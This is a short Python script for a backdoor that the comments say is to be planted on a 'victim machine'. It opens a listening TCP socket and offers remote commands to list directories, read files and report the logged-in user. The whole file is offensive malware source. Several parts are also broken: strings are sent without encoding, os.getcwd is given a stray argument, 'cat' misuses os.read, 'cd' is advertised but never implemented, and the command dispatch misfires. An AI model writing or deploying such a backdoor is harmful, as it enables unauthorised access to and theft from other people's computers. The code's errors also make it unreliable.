import socket
from _thread import *
import sys
import os
import platform

# One must fill these variables out before implementing this program into the victim machine
bind_ip     = 0
bind_port   = 0
max_backlog = 0

def msg(cl):
    cl.send("Welcome\n")
    cl.send("help  = Prints this message\n")
    cl.send("pwd   = See the current directory in victim machine\n")
    cl.send("cd    = Change directories in victim machine\n")
    cl.send("ls    = Lists everything in directory\n")
    cl.send("cat   = Shows contents of file\n")
    cl.send("login = Shows the name of the user logged on (Unix only)\n")

def tcps():
    tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        tcpserver.bind((bind_ip, int(bind_port)))

        tcpserver.listen(int(max_backlog))

        def hclient(cl):
            msg(cl)

            while 1:
                cinput = cl.recv(1024)

                if cinput == "help":
                    msg(cl)

                if cinput == "pwd":
                    try:
                        cl.send(os.getcwd())
                    except:
                        cl.send("Exception!!!")

                if cinput == "ls":
                    try:
                        cl.send(os.listdir(os.getcwd(0)))
                    except:
                        cl.send("Exception!!!")

                if cinput == "cat":
                    cl.send("Please specify the file: ")
                    dir = cl.recv(1024)
                    try:
                        os.read(dir,2048)
                    except:
                        cl.send("Exception!!!")

                if cinput == "login":
                    if platform.system() == "Windows":
                        cl.send("The login command cannot be done on a Windows machine")
                    else:
                        try:
                            cl.send(os.getlogin())
                        except:
                            cl.send("Exception!!!")

                else:
                    cl.send("Please enter a recognized command")

                if not len(cinput):
                    cl.close()
                    break


        while 1:
            cl, addr = tcpserver.accept()

            start_new_thread(hclient , (cl,))


    except KeyboardInterrupt:
        tcpserver.close()

        sys.exit()
    except socket.error:
        tcpserver.close()

        sys.exit()
    except:
        tcpserver.close()

        sys.exit()

if __name__  == "__main__":
    tcps()
